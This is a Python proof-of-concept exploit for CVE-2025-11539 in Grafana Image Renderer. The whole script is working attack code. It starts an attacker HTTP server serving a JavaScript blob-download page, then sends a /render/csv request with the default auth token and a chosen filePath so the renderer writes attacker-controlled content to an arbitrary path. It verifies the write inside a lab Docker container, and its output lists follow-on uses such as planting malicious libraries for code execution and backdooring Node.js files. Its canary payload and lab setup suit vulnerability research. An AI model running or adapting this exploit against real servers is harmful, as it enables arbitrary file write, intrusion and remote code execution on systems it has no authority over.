#!/usr/bin/env python3
# ──────────────────────────────────────────────────────────────────────
# Exploit Title  : Grafana Image Renderer Full Content Control via /render/csv
# CVE            : CVE-2025-11539
# Vendor         : Grafana Labs
# Product        : Grafana Image Renderer
# Affected       : 1.0.0 through 4.0.16
# Type           : CWE-94 - Code Injection
# CVSS           : 9.9 (Critical)
# Platform       : Node.js / Linux
# Author         : Exploit Intelligence Platform
# Website        : https://exploit-intel.com
# Twitter        : @exploit_intel
# Date           : 2025-10-09
#
# For authorized security testing and educational purposes only.
# ──────────────────────────────────────────────────────────────────────
"""
CVE-2025-11539 Vector 2: Full Content Control via /render/csv

Demonstrates the more dangerous variant using the /render/csv endpoint.
The attacker controls BOTH the file content (via a hosted download page)
AND the destination path (via the filePath parameter).

ATTACK CHAIN:
  1. Start attacker HTTP server hosting a page that triggers a file download
  2. Send GET /render/csv with url=attacker-server and filePath=traversal
  3. Renderer navigates Chromium to attacker URL, downloads content
  4. fs.copyFileSync copies attacker content to attacker-controlled path

PREREQUISITES:
  - Target running Grafana Image Renderer 1.0.0 through 4.0.16
  - Default auth token "-" (or known token)
  - Renderer container can reach attacker HTTP server (host.docker.internal)
  - Python 3.6+ (stdlib only, no external dependencies)

REFERENCES:
  - CVE-2025-11539
  - https://grafana.com/security/security-advisories/cve-2025-11539/
  - https://github.com/grafana/grafana-image-renderer/releases/tag/v4.0.17

Usage:
    python3 poc_vector2.py [renderer_host] [renderer_port] [container_name]
"""

import sys
import os
import time
import json
import subprocess
import urllib.request
import urllib.error
import uuid
import threading
import http.server
import socketserver


# ============================================================
# Configuration
# ============================================================

DEFAULT_PORT = 8081
DEFAULT_CONTAINER = "cve-2025-11539-renderer"
AUTH_TOKEN = "-"  # Default auth token from default.json

# Attacker HTTP server config — serves the download payload
ATTACKER_SERVER_PORT = 18081

# The canary string proves full content control — if this exact string
# appears at the target path, the attacker controls file content
CANARY_STRING = "CVE-2025-11539-FULL-CONTENT-CONTROL-PROOF-{uid}"

# Target file path inside the renderer container
TRAVERSAL_TARGET = "/tmp/cve-2025-11539-csv-poc-{uid}.bin"


def get_renderer_ip():
    """Auto-detect the renderer container IP on the lab network."""
    for network in ["cve-2025-11539_lab-net", "lab-net"]:
        try:
            result = subprocess.run(
                ["docker", "inspect", DEFAULT_CONTAINER,
                 "--format", '{{(index .NetworkSettings.Networks "' + network + '").IPAddress}}'],
                capture_output=True, text=True, timeout=10
            )
            ip = result.stdout.strip()
            if ip and result.returncode == 0:
                return ip
        except (subprocess.SubprocessError, FileNotFoundError):
            pass
    return None


def get_attacker_ip():
    """Get the IP the renderer container can use to reach the attacker server.

    Uses host.docker.internal (works on macOS and Linux with extra_hosts).
    Falls back to detecting the host LAN IP.
    """
    # host.docker.internal is mapped via extra_hosts in docker-compose.yml
    return "host.docker.internal"


class PayloadHandler(http.server.BaseHTTPRequestHandler):
    """
    HTTP request handler that serves an HTML page triggering a file download
    with attacker-controlled content.

    When Chromium navigates to this page:
    1. The page loads and JavaScript executes
    2. A Blob is created with the attacker's payload content
    3. A hidden <a> element with download attribute triggers the download
    4. Chromium saves the file to its download directory (set by Page.setDownloadBehavior)
    5. The renderer's chokidar watcher detects the download
    6. fs.copyFileSync copies it to the attacker-controlled filePath
    """

    canary = ""  # Set by the exploit function

    def do_GET(self):
        if self.path == "/trigger-download":
            # Serve HTML page that triggers a download via JavaScript
            html = f"""<!DOCTYPE html>
<html>
<head><title>Download Trigger</title></head>
<body>
<script>
// Create a Blob with the attacker's payload content
var payload = "{self.canary}";
var blob = new Blob([payload], {{type: 'application/octet-stream'}});
var url = URL.createObjectURL(blob);

// Create a hidden download link and click it
var a = document.createElement('a');
a.href = url;
a.download = 'payload.csv';
a.style.display = 'none';
document.body.appendChild(a);
a.click();

// Clean up
URL.revokeObjectURL(url);
</script>
<p>Downloading...</p>
</body>
</html>"""
            self.send_response(200)
            self.send_header("Content-Type", "text/html")
            self.send_header("Content-Length", str(len(html)))
            self.end_headers()
            self.wfile.write(html.encode())

        elif self.path == "/direct-download":
            # Alternative: serve the payload directly as a download
            # This approach uses Content-Disposition header
            payload = self.canary.encode()
            self.send_response(200)
            self.send_header("Content-Type", "application/octet-stream")
            self.send_header("Content-Disposition", "attachment; filename=payload.csv")
            self.send_header("Content-Length", str(len(payload)))
            self.end_headers()
            self.wfile.write(payload)

        else:
            self.send_response(404)
            self.end_headers()

    def log_message(self, format, *args):
        """Custom logging with prefix."""
        print(f"    [Attacker Server] {args[0]}")


def start_attacker_server(port, canary):
    """Start the attacker HTTP server in a background thread."""
    PayloadHandler.canary = canary

    server = socketserver.TCPServer(("0.0.0.0", port), PayloadHandler)
    server.allow_reuse_address = True

    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    return server


def check_file_content(container, filepath, expected_content, timeout=30):
    """
    Watch for a file to appear in the container and verify its content.

    Returns (found, content_matches, actual_content)
    """
    evidence_path = filepath + ".evidence"
    watch_script = (
        f'for i in $(seq 1 {timeout * 20}); do '
        f'  if [ -f "{filepath}" ]; then '
        f'    cp "{filepath}" "{evidence_path}" 2>/dev/null; '
        f'    echo "FILE_FOUND"; '
        f'    ls -la "{filepath}"; '
        f'    file "{filepath}"; '
        f'    echo "---CONTENT_START---"; '
        f'    cat "{filepath}" 2>/dev/null; '
        f'    echo "---CONTENT_END---"; '
        f'    exit 0; '
        f'  fi; '
        f'  sleep 0.05; '
        f'done; '
        f'echo "FILE_NOT_FOUND"; exit 1'
    )

    try:
        result = subprocess.run(
            ["docker", "exec", container, "bash", "-c", watch_script],
            capture_output=True, text=True, timeout=timeout + 10
        )
        output = result.stdout.strip()
        found = "FILE_FOUND" in output

        # Extract content between markers
        actual_content = ""
        if "---CONTENT_START---" in output and "---CONTENT_END---" in output:
            start = output.index("---CONTENT_START---") + len("---CONTENT_START---")
            end = output.index("---CONTENT_END---")
            actual_content = output[start:end].strip()

        content_matches = expected_content in actual_content
        return found, content_matches, actual_content, output

    except subprocess.TimeoutExpired:
        return False, False, "", "Watcher timed out"
    except (subprocess.SubprocessError, FileNotFoundError) as e:
        return False, False, "", f"Docker exec failed: {e}"


def exploit(target_host, target_port, container_name=DEFAULT_CONTAINER):
    """
    Demonstrate CVE-2025-11539 full content control via /render/csv endpoint.

    Steps:
    1. Start an HTTP server with attacker-controlled download content
    2. Start a file watcher inside the container
    3. Send GET /render/csv with url pointing to attacker server, filePath with traversal
    4. Verify the file content matches the attacker's payload
    """
    uid = uuid.uuid4().hex[:8]
    canary = CANARY_STRING.format(uid=uid)
    target_file = TRAVERSAL_TARGET.format(uid=uid)
    attacker_ip = get_attacker_ip()

    print(f"=" * 70)
    print(f"  CVE-2025-11539 PoC — Full Content Control via /render/csv")
    print(f"=" * 70)
    print(f"  Target:         {target_host}:{target_port}")
    print(f"  Container:      {container_name}")
    print(f"  Auth Token:     {AUTH_TOKEN}")
    print(f"  Write Path:     {target_file}")
    print(f"  Attacker Server: {attacker_ip}:{ATTACKER_SERVER_PORT}")
    print(f"  Canary String:  {canary}")
    print(f"=" * 70)
    print()

    # ── Step 1: Start attacker HTTP server ────────────────────────────
    print("[*] Step 1: Starting attacker HTTP server...")
    try:
        server = start_attacker_server(ATTACKER_SERVER_PORT, canary)
        print(f"    Listening on 0.0.0.0:{ATTACKER_SERVER_PORT}")
        print(f"    /trigger-download — HTML page triggering blob download")
        print(f"    /direct-download  — Direct file download via Content-Disposition")
    except OSError as e:
        print(f"[-] Failed to start server on port {ATTACKER_SERVER_PORT}: {e}")
        print("    Try a different port or kill the process using it")
        return False
    print()

    # ── Step 2: Start file watcher ────────────────────────────────────
    print("[*] Step 2: Starting file watcher inside container...")
    watcher_result = {"found": False, "content_matches": False, "content": "", "output": ""}

    def run_watcher():
        f, cm, c, o = check_file_content(container_name, target_file, canary, timeout=45)
        watcher_result["found"] = f
        watcher_result["content_matches"] = cm
        watcher_result["content"] = c
        watcher_result["output"] = o

    watcher_thread = threading.Thread(target=run_watcher, daemon=True)
    watcher_thread.start()
    time.sleep(0.5)
    print()

    # ── Step 3: Send exploit request ──────────────────────────────────
    # Try the JavaScript-triggered download first
    attacker_url = f"http://{attacker_ip}:{ATTACKER_SERVER_PORT}/trigger-download"
    print(f"[*] Step 3: Sending exploit request to /render/csv...")
    print(f"    GET /render/csv?url={attacker_url}&filePath={target_file}&timeout=30")
    print(f"    X-Auth-Token: {AUTH_TOKEN}")
    print()

    render_url = (
        f"http://{target_host}:{target_port}/render/csv"
        f"?url={urllib.request.quote(attacker_url, safe='/:@')}"
        f"&filePath={urllib.request.quote(target_file, safe='')}"
        f"&timeout=30"
    )

    req = urllib.request.Request(render_url)
    req.add_header("X-Auth-Token", AUTH_TOKEN)

    try:
        resp = urllib.request.urlopen(req, timeout=90)
        status = resp.status
        content_type = resp.headers.get("Content-Type", "unknown")
        body = resp.read()
        print(f"[+] Response: HTTP {status}, Content-Type: {content_type}, Body size: {len(body)} bytes")
        # Check if the response body itself contains the canary (it should — it returns the file)
        if canary.encode() in body:
            print(f"[+] Response body contains canary string — file was written and returned")
    except urllib.error.HTTPError as e:
        print(f"[-] HTTP Error: {e.code} {e.reason}")
        body = e.read()
        print(f"    Response: {body.decode('utf-8', errors='replace')[:500]}")
        if e.code == 500:
            print("[*] 500 error may indicate download timeout — trying direct download approach...")
    except urllib.error.URLError as e:
        print(f"[-] Connection failed: {e.reason}")
        print("[!] Cannot reach renderer")
        server.shutdown()
        return False
    except Exception as e:
        print(f"[-] Request error: {e}")

    # ── Step 4: Verify file content ───────────────────────────────────
    print()
    print("[*] Step 4: Waiting for file watcher to verify content...")
    watcher_thread.join(timeout=50)

    # Shut down attacker server
    server.shutdown()

    if watcher_result["found"] and watcher_result["content_matches"]:
        print()
        print("[+] ═══════════════════════════════════════════════════════════════")
        print("[+]  FULL CONTENT CONTROL CONFIRMED!")
        print("[+]  Attacker-controlled content written to arbitrary path")
        print("[+] ═══════════════════════════════════════════════════════════════")
        print()
        for line in watcher_result["output"].split("\n"):
            print(f"    {line}")
        print()
        print(f"[+] Expected canary: {canary}")
        print(f"[+] File content:    {watcher_result['content'][:200]}")
        print(f"[+] Content match:   ✓ EXACT MATCH")
        print()
        print("[+] Impact: The attacker controls BOTH the file content AND the path.")
        print("[+]         This enables:")
        print("[+]           - Writing malicious .so libraries for RCE via Chromium")
        print("[+]           - Overwriting Node.js source files with backdoors")
        print("[+]           - Replacing config.json to change auth tokens")
        print("[+]           - Any arbitrary file write with chosen binary content")
        return True

    elif watcher_result["found"]:
        print()
        print("[+] File was written to the target path (arbitrary file write confirmed)")
        print(f"[-] But content does not match canary:")
        print(f"    Expected: {canary}")
        print(f"    Got:      {watcher_result['content'][:200]}")
        print()
        print("[+] PARTIAL SUCCESS — Path traversal works, content control needs adjustment")
        return True  # Still proves the vulnerability

    else:
        print()
        print(f"[-] File watcher output: {watcher_result['output'][:500]}")
        print("[!] File was NOT detected at the target path")
        print("[!] Possible causes:")
        print("[!]   - Download was not triggered (check attacker server logs)")
        print("[!]   - Timeout waiting for download")
        print("[!]   - Chromium could not reach attacker server")
        return False


if __name__ == "__main__":
    if len(sys.argv) > 1 and sys.argv[1] in ("-h", "--help"):
        print(__doc__)
        sys.exit(0)

    target_host = sys.argv[1] if len(sys.argv) > 1 else get_renderer_ip()
    target_port = int(sys.argv[2]) if len(sys.argv) > 2 else DEFAULT_PORT
    container = sys.argv[3] if len(sys.argv) > 3 else DEFAULT_CONTAINER

    if not target_host:
        print("[-] Could not auto-detect renderer IP. Provide it as an argument.")
        sys.exit(1)

    print(f"[*] Auto-detected renderer IP: {target_host}")
    print()

    success = exploit(target_host, target_port, container)
    sys.exit(0 if success else 1)
